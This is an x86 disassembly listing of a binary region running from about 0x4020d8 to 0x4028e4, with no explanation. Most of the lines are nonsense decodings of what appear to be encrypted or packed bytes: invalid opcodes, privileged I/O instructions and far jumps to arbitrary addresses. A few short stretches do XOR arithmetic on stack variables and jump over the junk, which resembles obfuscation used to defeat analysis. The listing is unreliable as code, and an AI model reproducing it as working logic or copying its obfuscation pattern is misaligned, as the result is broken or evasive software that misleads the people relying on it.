  4020d8:	jns    0x402105
  4020da:	jne    0x4020e5
  4020dc:	cdq    
  4020dd:	or     BYTE PTR ds:[ebx-0x15],dl
  4020e1:	les    ecx,FWORD PTR [edx+0x1195364f]
  4020e7:	imul   eax,DWORD PTR [ebp+0xe],0xbcdcf9bc
  4020ee:	mov    esp,cs
  4020f0:	pop    ebx
  4020f1:	loop   0x40208d
  4020f3:	push   0x3c
  4020f5:	repz inc edi
  4020f7:	and    eax,0x3d8704f5
  4020fc:	xor    BYTE PTR [eax+edx*2],al
  4020ff:	loop   0x40216c
  402101:	jo     0x402164
  402103:	rcl    BYTE PTR [esi-0x421c191f],cl
  402109:	inc    edi
  40210a:	dec    esi
  40210b:	dec    esp
  40210c:	loop   0x4020c0
  40210e:	or     BYTE PTR [esi+0x9fcfbb8],0x48
  402115:	mov    eax,ds:0x399fe0a2
  40211a:	mov    cl,0x8a
  40211c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40211d:	test   al,0xa0
  40211f:	nop
  402120:	in     eax,dx
  402121:	das    
  402122:	push   ebp
  402123:	fwait
  402124:	jb     0x4020e5
  402126:	(bad)  
  402127:	pop    edi
  402128:	jnp    0x402188
  40212a:	xchg   edi,eax
  40212b:	or     dl,0x2d
  40212e:	(bad)  [edi-0x58d1f590]
  402134:	ins    BYTE PTR es:[edi],dx
  402135:	fldenv [eax]
  402137:	push   es
  402138:	aad    0xc4
  40213a:	cmp    BYTE PTR [ebp+eax*8+0x6d],cl
  40213e:	in     eax,0x72
  402140:	dec    ecx
  402141:	dec    esp
  402142:	push   0xafad5ab7
  402147:	jno    0x402173
  402149:	loope  0x4021a1
  40214b:	push   cs
  40214c:	inc    esp
  40214d:	inc    eax
  40214e:	sub    cl,BYTE PTR [ecx+0x3d94acae]
  402154:	mov    eax,ds:0x93d3a1c6
  402159:	jne    0x402142
  40215b:	xor    esi,DWORD PTR [edx+0x13]
  40215e:	lock mov eax,ds:0x1caf084b
  402164:	aaa    
  402165:	or     al,0xe1
  402167:	jns    0x40216f
  402169:	leave  
  40216a:	mov    dl,ah
  40216c:	push   0x73c0702a
  402171:	pusha  
  402172:	add    BYTE PTR [ecx-0x68221c9d],0x5
  402179:	cmp    BYTE PTR [esi],ah
  40217b:	jne    0x402191
  40217d:	int    0x17
  40217f:	pop    ebp
  402180:	pop    ds
  402181:	jle    0x4021ec
  402183:	pop    ecx
  402184:	jns    0x40213b
  402186:	sti    
  402187:	scas   eax,DWORD PTR es:[edi]
  402188:	push   ecx
  402189:	push   0x1d
  40218b:	lods   eax,DWORD PTR ds:[esi]
  40218c:	mov    dl,0x3d
  40218e:	mov    ecx,0x773d7a26
  402193:	(bad)  
  402195:	push   ecx
  402196:	das    
  402197:	jg     0x4021f4
  402199:	xchg   esi,eax
  40219a:	nop
  40219b:	les    ecx,FWORD PTR [edx+esi*4+0x7f]
  40219f:	push   0x7d
  4021a1:	pop    ss
  4021a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4021a3:	(bad)  
  4021a4:	out    0xe8,al
  4021a6:	sbb    eax,0xcdb13be9
  4021ab:	js     0x4021cf
  4021ad:	sbb    dl,BYTE PTR [esi]
  4021af:	mov    esi,0xcbe8df42
  4021b4:	sbb    BYTE PTR [edi-0xd26ae48],bl
  4021ba:	outs   dx,DWORD PTR ds:[esi]
  4021bb:	cmp    BYTE PTR [ebp-0x53],dh
  4021be:	lods   eax,DWORD PTR ds:[esi]
  4021bf:	mov    BYTE PTR [edi],cl
  4021c1:	and    al,0x10
  4021c3:	sbb    DWORD PTR [edx-0x4],edx
  4021c6:	adc    BYTE PTR [edi],bh
  4021c8:	cs imul eax,eax,0xbc700176
  4021cf:	popa   
  4021d0:	xor    DWORD PTR [eax+0x72],ebp
  4021d3:	jno    0x4021a4
  4021d5:	push   esp
  4021d6:	fbstp  TBYTE PTR [ebp-0x46f9cf2c]
  4021dc:	shl    BYTE PTR [ebp-0x46],0xa7
  4021e0:	pop    ebx
  4021e1:	mov    esi,0x5f02e0e4
  4021e6:	shl    BYTE PTR [ebx],0x3a
  4021e9:	call   0x3777:0xd8058a4c
  4021f0:	sub    DWORD PTR [ebx],eax
  4021f2:	lea    ebp,[ebx+0x45]
  4021f5:	outs   dx,BYTE PTR ds:[esi]
  4021f6:	adc    DWORD PTR [edx-0x57],edx
  4021f9:	mov    edi,0x545a26e7
  4021fe:	jp     0x4021e5
  402200:	jg     0x402250
  402202:	test   ah,ah
  402204:	xchg   esp,eax
  402205:	cmp    DWORD PTR ds:0x91a43878,edi
  40220b:	pop    esp
  40220c:	mov    cs,esi
  40220e:	outs   dx,BYTE PTR ds:[esi]
  40220f:	clc    
  402210:	ds mov al,0xd1
  402213:	das    
  402214:	popa   
  402215:	inc    ebp
  402216:	gs addr16 push edi
  402219:	add    BYTE PTR [eax-0x73],ch
  40221c:	in     al,dx
  40221d:	jno    0x4021d1
  40221f:	push   eax
  402220:	jmp    0x402278
  402222:	mov    ch,0x4b
  402224:	mov    eax,esp
  402226:	pop    esp
  402227:	pop    esi
  402228:	fwait
  402229:	call   0xf863:0x2923e0d3
  402230:	out    0x7c,eax
  402232:	test   eax,0xa73384d2
  402237:	out    0xe4,al
  402239:	in     al,dx
  40223a:	add    DWORD PTR [eax+0x6f51b84d],ebp
  402240:	scas   al,BYTE PTR es:[edi]
  402241:	cmp    eax,0x681cd92c
  402246:	inc    esp
  402247:	dec    ebx
  402248:	loop   0x402275
  40224a:	dec    esi
  40224b:	xchg   ebx,eax
  40224c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40224d:	adc    DWORD PTR [esi-0x693aaa16],0xfab4ec56
  402257:	test   eax,0xea0c732e
  40225c:	push   ecx
  40225d:	cmp    BYTE PTR [esp+ebp*1-0x77d38f4b],cl
  402264:	cdq    
  402265:	retf   0x2705
  402268:	push   edi
  402269:	xchg   DWORD PTR [ebx-0x5b2bf99e],ecx
  40226f:	pop    esp
  402270:	push   es
  402271:	rcr    BYTE PTR [edx+0x2d],0x18
  402275:	mov    ebp,0x481840f
  40227a:	add    BYTE PTR [eax],al
  40227c:	mov    eax,DWORD PTR [ebp-0x14]
  40227f:	xor    eax,ecx
  402281:	add    eax,esi
  402283:	mov    DWORD PTR [ebp-0x30],eax
  402286:	mov    eax,DWORD PTR [ebp-0x34]
  402289:	jmp    0x4024a6
  40228e:	jp     0x40222b
  402290:	sbb    al,0xe8
  402292:	cdq    
  402293:	ja     0x402267
  402295:	jno    0x40227a
  402297:	sbb    al,0x20
  402299:	sub    DWORD PTR [eax],ecx
  40229b:	dec    BYTE PTR [esi+0x7002707c]
  4022a1:	jo     0x402313
  4022a3:	jle    0x402315
  4022a5:	jo     0x402322
  4022a7:	and    al,0x66
  4022a9:	inc    esp
  4022aa:	xlat   BYTE PTR ds:[ebx]
  4022ab:	aam    0xa8
  4022ad:	addr16 inc esp
  4022af:	xchg   edi,eax
  4022b0:	mov    esp,0x64ef95a
  4022b5:	outs   dx,BYTE PTR ds:[esi]
  4022b6:	and    cl,dh
  4022b8:	cmp    edi,DWORD PTR [ebp+0x32]
  4022bb:	hlt    
  4022bc:	mov    dh,0x47
  4022be:	xchg   BYTE PTR [ebx+0x776f9172],ah
  4022c4:	mov    cl,0x8b
  4022c6:	daa    
  4022c7:	xlat   BYTE PTR fs:[ebx]
  4022c9:	ret    
  4022ca:	clc    
  4022cb:	dec    edi
  4022cc:	adc    bh,BYTE PTR ds:0xa88c071e
  4022d2:	xchg   esp,eax
  4022d3:	retf   0x89c4
  4022d6:	jl     0x4022a2
  4022d8:	xor    BYTE PTR [ecx-0x12],0x45
  4022dc:	daa    
  4022dd:	outs   dx,DWORD PTR ds:[esi]
  4022de:	loopne 0x402329
  4022e0:	imul   edx,DWORD PTR [edi],0x5f
  4022e3:	int3   
  4022e4:	jnp    0x4022c4
  4022e6:	xchg   BYTE PTR [ebp-0x42deb29a],bl
  4022ec:	pop    esp
  4022ed:	cmovns edi,ebx
  4022f0:	fs xchg ecx,eax
  4022f2:	sbb    ecx,eax
  4022f4:	stos   BYTE PTR es:[edi],al
  4022f5:	(bad)  
  4022f6:	dec    ecx
  4022f7:	mov    ah,0x1f
  4022f9:	adc    eax,0xf6544559
  4022fe:	mov    al,ds:0x1d84a0ca
  402303:	push   0x271abd01
  402308:	dec    edi
  402309:	addr16 int 0xfc
  40230c:	lea    ebx,[eax+0x1a]
  40230f:	call   0x7973b756
  402314:	xor    BYTE PTR [edi+0xaf37033],bh
  40231a:	cmp    ah,cl
  40231c:	pop    ds
  40231d:	and    edx,ebx
  40231f:	shr    BYTE PTR [eax+0x6db942a8],0x8
  402326:	retf   
  402327:	scas   eax,DWORD PTR es:[edi]
  402328:	sub    ch,BYTE PTR [eax+0x74]
  40232b:	mov    eax,0xb11ba784
  402330:	fidiv  WORD PTR [edi+0x6724a357]
  402336:	(bad)  
  402337:	lods   eax,DWORD PTR ds:[esi]
  402338:	stos   BYTE PTR es:[edi],al
  402339:	pop    ebx
  40233a:	int    0xb1
  40233c:	jnp    0x402396
  40233e:	jg     0x40239f
  402340:	loope  0x402311
  402342:	jmp    0x402304
  402344:	sub    DWORD PTR [ebx+0x7],esp
  402347:	jmp    0x4023a5
  402349:	cs aad 0x78
  40234c:	cmp    DWORD PTR ds:0xe240be98,edx
  402352:	push   ebp
  402353:	cmp    DWORD PTR [ebp+0x7f63b701],eax
  402359:	push   ebp
  40235a:	fdivr  DWORD PTR [ecx+0x6956a401]
  402360:	(bad)  
  402361:	ret    
  402362:	and    al,0xb3
  402364:	out    dx,eax
  402365:	int    0xe6
  402367:	rcl    DWORD PTR [eax+0x7b],0xb
  40236b:	push   edi
  40236c:	mov    eax,0xaad26269
  402371:	sub    al,0xd1
  402373:	add    DWORD PTR [ebp-0x2773df4a],eax
  402379:	fldz   
  40237b:	inc    edx
  40237c:	sar    BYTE PTR [eax+0x42],cl
  40237f:	xchg   ebp,eax
  402380:	ret    0x3c77
  402383:	dec    esp
  402384:	jns    0x40236f
  402386:	in     eax,0xc0
  402388:	mul    BYTE PTR [ecx-0x5e]
  40238b:	cdq    
  40238c:	push   esp
  40238d:	in     eax,dx
  40238e:	or     esp,DWORD PTR [eax+0x25dace39]
  402394:	gs inc ecx
  402396:	push   ds
  402397:	sbb    DWORD PTR [ebx-0x1a9f6333],esi
  40239d:	psubb  mm2,QWORD PTR [esp+ebp*4-0x28462469]
  4023a5:	int3   
  4023a6:	pop    eax
  4023a7:	dec    edx
  4023a8:	mov    dl,cl
  4023aa:	add    ebx,ecx
  4023ac:	adc    esi,DWORD PTR [edi-0x796b4a7c]
  4023b2:	popa   
  4023b3:	mov    eax,0xa8892c6b
  4023b8:	jmp    0xf78d:0x2dad8749
  4023bf:	lods   al,BYTE PTR ds:[esi]
  4023c0:	fisub  WORD PTR [eax+0x785ca5cd]
  4023c6:	into   
  4023c7:	mov    al,ds:0x4a6ff72c
  4023cc:	sahf   
  4023cd:	mov    eax,0xc7845d28
  4023d2:	mul    DWORD PTR [edx+0x4ba5c0a7]
  4023d8:	sbb    DWORD PTR [ecx-0x80],eax
  4023db:	jmp    0x85bae9ba
  4023e0:	adc    eax,0x928b34ce
  4023e5:	pop    ebx
  4023e6:	cmp    eax,DWORD PTR [edx+0x5b]
  4023e9:	mov    bh,0xf8
  4023eb:	shl    DWORD PTR [esi],cl
  4023ed:	mov    esp,0x7fc8e473
  4023f2:	add    al,0xed
  4023f4:	sub    al,0xe8
  4023f6:	pop    esp
  4023f7:	(bad)  
  4023f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023f9:	addr16 push es
  4023fb:	mov    al,ds:0xabf78fdc
  402400:	xchg   edx,eax
  402401:	lods   eax,DWORD PTR ds:[esi]
  402402:	enter  0xf0ea,0x57
  402406:	xchg   esp,eax
  402407:	bound  ecx,QWORD PTR ds:0x120cc76c
  40240d:	imul   edx,esi,0x6f
  402410:	cwde   
  402411:	xor    edi,DWORD PTR [eax+0x67]
  402414:	xor    al,bl
  402416:	ds std 
  402418:	iret   
  402419:	mov    BYTE PTR [esi+0x478051a3],dh
  40241f:	xchg   edx,eax
  402420:	rcr    BYTE PTR [esi-0x6db5df90],1
  402426:	xchg   ecx,eax
  402427:	scas   eax,DWORD PTR es:[edi]
  402428:	mov    cl,bl
  40242a:	ins    BYTE PTR es:[edi],dx
  40242b:	lea    ecx,[ebx-0x5059dbb5]
  402431:	jae    0x40241c
  402433:	or     al,0xbf
  402435:	ret    0xdf84
  402438:	pop    esp
  402439:	sahf   
  40243a:	and    eax,DWORD PTR [edi]
  40243c:	push   es
  40243d:	cwde   
  40243e:	popa   
  40243f:	mov    dh,0x91
  402441:	push   es
  402442:	jl     0x4023e8
  402444:	jecxz  0x402418
  402446:	and    eax,0x33fb9546
  40244b:	inc    edi
  40244c:	shl    ah,0x99
  40244f:	sbb    al,0x3b
  402451:	mov    ah,0xf3
  402453:	xlat   BYTE PTR ds:[ebx]
  402454:	ins    BYTE PTR es:[edi],dx
  402455:	inc    ebx
  402456:	(bad)  [ebp+0x27]
  402459:	das    
  40245a:	scas   eax,DWORD PTR es:[edi]
  40245b:	pop    esi
  40245c:	sbb    dl,0x23
  40245f:	leave  
  402460:	into   
  402461:	lods   al,BYTE PTR ds:[esi]
  402462:	xchg   ebx,eax
  402463:	sti    
  402464:	pop    esp
  402465:	pop    esi
  402466:	cmp    BYTE PTR [ebp+eiz*4+0x30],0x64
  40246b:	adc    al,0xe6
  40246d:	outs   dx,DWORD PTR ds:[si]
  40246f:	inc    edx
  402470:	lock test edx,esp
  402473:	dec    eax
  402474:	push   ds
  402475:	jl     0x402415
  402477:	mov    dh,0xf1
  402479:	(bad)  [edx]
  40247b:	mov    edi,0x49e5c738
  402480:	fstp   TBYTE PTR ds:[esi-0x1c3599dd]
  402487:	rol    BYTE PTR [edx-0x1c],1
  40248a:	dec    esi
  40248b:	and    esi,DWORD PTR [eax+0x48]
  40248e:	sub    ch,BYTE PTR [eax+eiz*2+0x55]
  402492:	xchg   DWORD PTR [ebx+eiz*2+0x10],ebx
  402496:	add    ch,bl
  402498:	inc    edi
  402499:	jmp    0x6aee:0x83576c5f
  4024a0:	out    dx,al
  4024a1:	mov    eax,0xae6bbdaa
  4024a6:	mov    dx,WORD PTR [ebp-0x38]
  4024aa:	mov    ebx,0x8a3e
  4024af:	xor    dx,bx
  4024b2:	mov    ebx,DWORD PTR [ebp-0x8]
  4024b5:	add    dx,di
  4024b8:	movzx  edx,dx
  4024bb:	xor    ebx,ecx
  4024bd:	lea    edx,[edx+ebx*1+0x32729c]
  4024c4:	add    DWORD PTR [eax],edx
  4024c6:	mov    eax,DWORD PTR [ebp-0x2c]
  4024c9:	mov    edx,DWORD PTR [ebp-0x8]
  4024cc:	mov    ebx,DWORD PTR [ebp-0x30]
  4024cf:	xor    edx,ecx
  4024d1:	add    edx,esi
  4024d3:	imul   edx,ebx
  4024d6:	sub    DWORD PTR [eax],edx
  4024d8:	mov    eax,DWORD PTR [ebp-0x14]
  4024db:	jmp    0x402730
  4024e0:	jmp    0x4026fd
  4024e5:	and    DWORD PTR [edi+edi*4+0x31714d76],esi
  4024ec:	jae    0x40250e
  4024ee:	xor    BYTE PTR [ecx-0x7da792c9],cl
  4024f4:	mov    esi,DWORD PTR [eax+0x0]
  4024f7:	jo     0x402569
  4024f9:	jo     0x402579
  4024fb:	jo     0x40256d
  4024fd:	and    BYTE PTR ds:0x2dca303d,0xcc
  402504:	jg     0x40249a
  402506:	stc    
  402507:	sub    esp,DWORD PTR [eax]
  402509:	sti    
  40250a:	ret    
  40250b:	push   ds
  40250c:	psubsw mm6,QWORD PTR [edx+eax*2-0xc9702e2]
  402514:	push   ss
  402515:	(bad)  
  402516:	adc    ebp,DWORD PTR [eax-0x8a7da3d]
  40251c:	les    esp,FWORD PTR [esi-0x2e]
  40251f:	jmp    0x918b:0xee6afadc
  402526:	call   0xd060ccdd
  40252b:	sub    al,0xbe
  40252d:	xor    ebp,ebx
  40252f:	enter  0xf021,0x1f
  402533:	cmp    ebx,DWORD PTR [ecx]
  402535:	lahf   
  402536:	xlat   BYTE PTR ds:[ebx]
  402537:	hlt    
  402538:	test   eax,0x50de95a3
  40253d:	cmp    eax,0x2a5795c0
  402542:	ret    0xa6b0
  402545:	or     bl,BYTE PTR [eax]
  402547:	mov    cl,BYTE PTR [eax]
  402549:	jmp    0x3252:0x1927261c
  402550:	adc    BYTE PTR [esi-0x15],dl
  402553:	add    ch,BYTE PTR [edi-0x4f0ebf99]
  402559:	and    BYTE PTR [edi+0xae0cc4e],dl
  40255f:	imul   edi,DWORD PTR [edi+0x4f0b5c9b],0x3ccbd3e6
  402569:	jl     0x4024f5
  40256b:	in     al,0x8b
  40256d:	push   0xffffff9b
  40256f:	and    esi,DWORD PTR [edx+0x49896aac]
  402575:	pop    ss
  402576:	cmp    al,0x3a
  402578:	mov    ah,0x51
  40257a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40257b:	in     eax,0xde
  40257d:	xor    bl,BYTE PTR [esi+0x41]
  402580:	ror    DWORD PTR [ebx+0x4bea2113],cl
  402586:	mov    dh,0xf8
  402588:	std    
  402589:	inc    edx
  40258a:	(bad)  
  40258b:	repz jno 0x4025c1
  40258e:	stc    
  40258f:	xor    eax,0x48f1eb6f
  402594:	add    BYTE PTR [ebx-0x4f],cl
  402597:	push   es
  402598:	push   0xffffffaf
  40259a:	repz mov ch,0x73
  40259d:	sub    esi,edx
  40259f:	lods   al,BYTE PTR ds:[esi]
  4025a0:	imul   DWORD PTR [ebx]
  4025a2:	loope  0x40257f
  4025a4:	xor    dh,ah
  4025a6:	xchg   edi,eax
  4025a7:	push   esi
  4025a8:	es call 0xb65ca2a7
  4025ae:	push   cs
  4025af:	jno    0x40259d
  4025b1:	mov    ah,0x44
  4025b3:	sub    DWORD PTR [eax+edx*8+0x3037de3f],ecx
  4025ba:	inc    esi
  4025bb:	or     esp,DWORD PTR [eax]
  4025bd:	mov    edx,0xc593d86c
  4025c2:	in     eax,dx
  4025c3:	das    
  4025c4:	ret    0xa9e4
  4025c7:	outs   dx,DWORD PTR ds:[esi]
  4025c8:	(bad)  
  4025c9:	pop    ecx
  4025ca:	out    dx,eax
  4025cb:	xchg   esp,eax
  4025cc:	and    BYTE PTR [eax-0x6a],0x48
  4025d0:	mov    al,ds:0xd632e5d2
  4025d5:	xor    edi,esp
  4025d7:	sbb    edx,DWORD PTR [ecx]
  4025d9:	sub    eax,0x534fa0f9
  4025de:	pop    edx
  4025df:	or     BYTE PTR [ebx],bl
  4025e1:	addr16 add eax,0xfa6ff4a2
  4025e7:	xchg   esp,eax
  4025e8:	dec    esi
  4025e9:	fcomp  DWORD PTR [ecx]
  4025eb:	lea    ecx,[edx]
  4025ed:	gs push edi
  4025ef:	(bad)  
  4025f0:	push   ds
  4025f1:	mov    al,ds:0x30ed77d8
  4025f6:	lahf   
  4025f7:	aad    0x9d
  4025f9:	push   eax
  4025fa:	jo     0x40260b
  4025fc:	js     0x4025ff
  4025fe:	mov    al,ds:0x66c815cc
  402603:	movups xmm3,xmm6
  402606:	lock scas eax,DWORD PTR es:[edi]
  402608:	jl     0x402591
  40260a:	rol    DWORD PTR [edi-0x3d],1
  40260d:	loop   0x40266b
  40260f:	or     al,0x91
  402611:	and    BYTE PTR [ebp+0x3c],ch
  402614:	add    eax,0xd8f34c6
  402619:	pop    ecx
  40261a:	push   esi
  40261b:	imul   ah
  40261d:	mov    ah,0x51
  40261f:	jbe    0x402604
  402621:	scas   al,BYTE PTR es:[edi]
  402622:	popf   
  402623:	ja     0x4025a7
  402625:	fsqrt  
  402627:	xchg   ecx,eax
  402628:	xor    al,0x5
  40262a:	jg     0x4025d5
  40262c:	mov    ds:0xf9ba6f91,al
  402631:	nop
  402632:	addr16 loopne 0x4026ae
  402635:	mov    ds:0x2232720e,al
  40263a:	cwde   
  40263b:	inc    ebx
  40263c:	lahf   
  40263d:	mov    ds:0x7beb3abe,al
  402642:	or     al,0x8a
  402644:	lods   al,BYTE PTR ds:[esi]
  402645:	pushf  
  402646:	out    dx,al
  402647:	sahf   
  402648:	(bad)  
  40264a:	pushf  
  40264b:	xchg   esp,eax
  40264c:	and    cl,BYTE PTR [eax+0x3453b2dc]
  402652:	sub    edi,esp
  402654:	imul   ebx,DWORD PTR [eax+0x4600ce9c],0x175ea193
  40265e:	mov    cl,0x9e
  402660:	fdiv   DWORD PTR [ebp-0x160d934e]
  402666:	ret    0x10ce
  402669:	hlt    
  40266a:	ret    
  40266b:	pop    es
  40266c:	adc    edx,eax
  40266e:	and    dl,BYTE PTR [edx+0x71247286]
  402674:	pop    edi
  402675:	mov    edx,0x54acb01
  40267a:	ret    0xfb88
  40267d:	jnp    0x4026a1
  40267f:	or     DWORD PTR [edx+0x15],0x14
  402683:	dec    esp
  402684:	cmp    ebp,DWORD PTR ds:0x725729bb
  40268a:	sti    
  40268b:	stos   DWORD PTR es:[edi],eax
  40268c:	xchg   ebp,eax
  40268d:	sysexit 
  40268f:	gs idiv ch
  402692:	hlt    
  402693:	cmp    eax,0x2227c774
  402698:	sub    ch,BYTE PTR [ecx+0x4e]
  40269b:	out    0xbe,al
  40269d:	and    ebx,DWORD PTR [esi]
  40269f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4026a0:	lods   eax,DWORD PTR ds:[esi]
  4026a1:	xchg   edi,eax
  4026a2:	and    cl,BYTE PTR [edx]
  4026a4:	xchg   DWORD PTR [ebx],ebp
  4026a6:	lahf   
  4026a7:	cmp    DWORD PTR [ecx+edx*1-0x54924811],esi
  4026ae:	test   eax,0xa7f68a34
  4026b3:	xchg   ebx,eax
  4026b4:	imul   esi,DWORD PTR [edx+0x42],0x34264332
  4026bb:	ret    0xba3d
  4026be:	outs   dx,DWORD PTR ds:[esi]
  4026bf:	lods   eax,DWORD PTR ds:[esi]
  4026c0:	mov    BYTE PTR [ebp-0x2557052b],al
  4026c6:	cmp    al,0x18
  4026c8:	lods   eax,DWORD PTR ds:[esi]
  4026c9:	xchg   BYTE PTR [edx+0x74],bh
  4026cc:	or     DWORD PTR [ecx-0x6],esp
  4026cf:	test   al,0x28
  4026d1:	pop    edi
  4026d2:	sti    
  4026d3:	int    0xa0
  4026d5:	(bad)
  4026d8:	jnp    0x4026b5
  4026da:	cmc    
  4026db:	push   ebx
  4026dc:	mov    ds:0x24ea8028,al
  4026e1:	inc    ebx
  4026e2:	mov    al,0x5b
  4026e4:	(bad)  
  4026e5:	xchg   DWORD PTR ds:[eax-0x3dae706b],esi
  4026ec:	jnp    0x4026ff
  4026ee:	les    edi,FWORD PTR [ecx-0x13]
  4026f1:	xchg   edx,eax
  4026f2:	shl    cl,cl
  4026f4:	dec    ebp
  4026f5:	retf   0x91ce
  4026f8:	mov    al,0x73
  4026fa:	xchg   esi,eax
  4026fb:	arpl   WORD PTR [ebx],sp
  4026fd:	mov    eax,DWORD PTR [ebp-0xc]
  402700:	mov    edx,DWORD PTR [ebp-0x18]
  402703:	xor    eax,edx
  402705:	cmp    eax,0x8cb40b7d
  40270a:	je     0x40272d
  402710:	mov    eax,DWORD PTR [ebp-0x10]
  402713:	add    DWORD PTR [eax],0x7403501
  402719:	jmp    0x40272d
  40271e:	mov    eax,DWORD PTR [ebp-0x1c]
  402721:	cmp    DWORD PTR [eax],0xf89f2da9
  402727:	jne    0x402748
  40272d:	mov    eax,DWORD PTR [ebp-0x8]
  402730:	xor    eax,ecx
  402732:	add    eax,esi
  402734:	test   eax,eax
  402736:	jne    0x402748
  40273c:	xor    DWORD PTR [ebp-0x20],0xe149ebe
  402743:	jmp    0x4012bf
  402748:	pop    ebx
  402749:	pop    edi
  40274a:	jmp    0x402967
  40274f:	cs dec edi
  402751:	add    dl,bl
  402753:	popa   
  402754:	push   ecx
  402755:	in     eax,dx
  402756:	jno    0x4026ea
  402758:	imul   ebx,DWORD PTR [ecx+esi*8],0xaf0b0f0a
  40275f:	jo     0x40276f
  402761:	jo     0x4027d3
  402763:	jo     0x4027e3
  402765:	jo     0x4027d7
  402767:	add    ah,bl
  402769:	in     eax,dx
  40276a:	or     edi,esi
  40276c:	push   es
  40276d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40276e:	fnstsw WORD PTR [edx+eax*8+0x4f073f51]
  402775:	out    0xdd,al
  402777:	aas    
  402778:	mov    ?,WORD PTR [esi]
  40277a:	shl    BYTE PTR [edx+0x6c],0xcd
  40277e:	and    al,0x2d
  402780:	sahf   
  402781:	dec    edi
  402782:	scas   al,BYTE PTR es:[edi]
  402783:	jae    0x4027a4
  402785:	repnz fld DWORD PTR [eax]
  402788:	fwait
  402789:	(bad)  
  40278a:	(bad)  [edi+0x2e]
  40278d:	bound  eax,QWORD PTR [ebx+0x3a]
  402790:	mov    bl,0x31
  402792:	ins    BYTE PTR es:[edi],dx
  402793:	and    eax,0xe3e156b6
  402798:	dec    esi
  402799:	dec    ebp
  40279a:	pop    ss
  40279b:	out    dx,eax
  40279c:	clc    
  40279d:	je     0x402746
  40279f:	js     0x4027fb
  4027a1:	cmp    eax,0xdabf13a1
  4027a6:	fwait
  4027a7:	push   cs
  4027a8:	add    DWORD PTR ds:0x3ce8e2e,eax
  4027ae:	lods   eax,DWORD PTR ds:[esi]
  4027af:	xchg   ebx,edx
  4027b1:	imul   eax,ecx,0xc15ae3cb
  4027b7:	jp     0x402813
  4027b9:	out    dx,eax
  4027ba:	cdq    
  4027bb:	inc    esi
  4027bc:	scas   eax,DWORD PTR es:[edi]
  4027bd:	pop    ecx
  4027be:	test   al,0x34
  4027c0:	vmwrite ebx,DWORD PTR [ebx]
  4027c3:	fcomp  DWORD PTR [esi-0x1f912ae7]
  4027c9:	test   BYTE PTR [ecx*2+0x6840f395],dh
  4027d0:	fdivp  st(2),st
  4027d2:	xchg   ecx,eax
  4027d3:	fbld   TBYTE PTR [esi-0x22]
  4027d6:	push   0x12
  4027d8:	xor    DWORD PTR ds:0xd7c19955,edx
  4027de:	push   edx
  4027df:	jmp    0x3f7c:0xd424bc39
  4027e6:	fmul   DWORD PTR [eax+0x20542395]
  4027ec:	outs   dx,DWORD PTR ds:[esi]
  4027ed:	cli    
  4027ee:	out    dx,al
  4027ef:	cmp    eax,0xce5c411
  4027f4:	imul   BYTE PTR [edx+0x2a2a86d3]
  4027fa:	push   ss
  4027fb:	mov    edx,0x17c95b60
  402800:	dec    edx
  402801:	xchg   ebp,eax
  402802:	retf   
  402803:	sub    DWORD PTR [ebp+0x6c1a41fa],esp
  402809:	or     al,0x42
  40280b:	jle    0x402793
  40280d:	push   ss
  40280e:	repz dec ecx
  402810:	mov    ch,0x33
  402812:	ds sbb ecx,esp
  402815:	stos   DWORD PTR es:[edi],eax
  402816:	nop
  402817:	dec    esp
  402818:	push   0x3c
  40281a:	out    0x56,al
  40281c:	jg     0x4027ac
  40281e:	mov    esi,0xb6702de5
  402823:	aas    
  402824:	cdq    
  402825:	aad    0x5b
  402827:	sahf   
  402828:	dec    edx
  402829:	out    dx,eax
  40282a:	hlt    
  40282b:	fld    QWORD PTR [edx-0x6]
  40282e:	mov    ds:0x10c4ae4,al
  402833:	xchg   ebp,eax
  402834:	push   0x1baf0d10
  402839:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40283a:	(bad)  
  40283c:	pop    eax
  40283d:	fwait
  40283e:	xchg   BYTE PTR [eax-0x7f6c3d02],bh
  402844:	pop    ebx
  402845:	sbb    al,0xc6
  402847:	popf   
  402848:	ja     0x40285c
  40284a:	sub    eax,0xd9811ae6
  40284f:	scas   al,BYTE PTR es:[edi]
  402850:	inc    ebp
  402851:	cmp    al,0x3f
  402853:	popf   
  402854:	and    eax,0xc4af3b25
  402859:	stc    
  40285a:	pop    ss
  40285b:	mov    al,0x67
  40285d:	test   eax,0x6ed47e2f
  402862:	mov    edi,0x9bc85324
  402867:	mov    bl,BYTE PTR [ecx]
  402869:	mov    dh,0x92
  40286b:	adc    al,BYTE PTR [ebx-0x28fd1971]
  402871:	add    BYTE PTR ds:0x47540567,ch
  402877:	pop    edx
  402878:	push   0xc12098fa
  40287d:	dec    edx
  40287e:	jp     0x402845
  402880:	scas   eax,DWORD PTR es:[edi]
  402881:	sub    al,0x93
  402883:	int    0x2d
  402885:	iret   
  402886:	pop    esp
  402887:	mov    ds:0xb90c7941,eax
  40288c:	les    dx,DWORD PTR [edi+0x2d]
  402890:	out    0xab,al
  402892:	pop    edx
  402893:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402894:	mov    es:0x1948704e,eax
  40289a:	in     eax,0x5e
  40289c:	inc    edx
  40289d:	mov    al,ds:0xc082dd0
  4028a2:	and    bl,BYTE PTR [edi-0x5]
  4028a5:	mov    esi,0xac321923
  4028aa:	jmp    0x73fc7bda
  4028af:	mov    esp,0x50b69be1
  4028b4:	dec    eax
  4028b5:	les    edx,FWORD PTR [ebx]
  4028b7:	fcomp  DWORD PTR [esi-0x55ecfa55]
  4028bd:	and    eax,esi
  4028bf:	aas    
  4028c0:	xchg   edx,eax
  4028c1:	test   BYTE PTR [ebx-0x34d91628],0xf3
  4028c8:	and    ah,cl
  4028ca:	arpl   WORD PTR [ecx+0x2b],sp
  4028cd:	or     bl,BYTE PTR [edi]
  4028cf:	pop    es
  4028d0:	stc    
  4028d1:	outs   dx,DWORD PTR ds:[esi]
  4028d2:	or     bh,BYTE PTR [eax+0x49d70586]
  4028d8:	jmp    0x402879
  4028da:	imul   ecx,DWORD PTR [edx+0x3a],0x118bc6cb
  4028e1:	sub    ch,BYTE PTR [edx+ebp*8]
  4028e4:	stos   BYTE PTR es:[edi],al
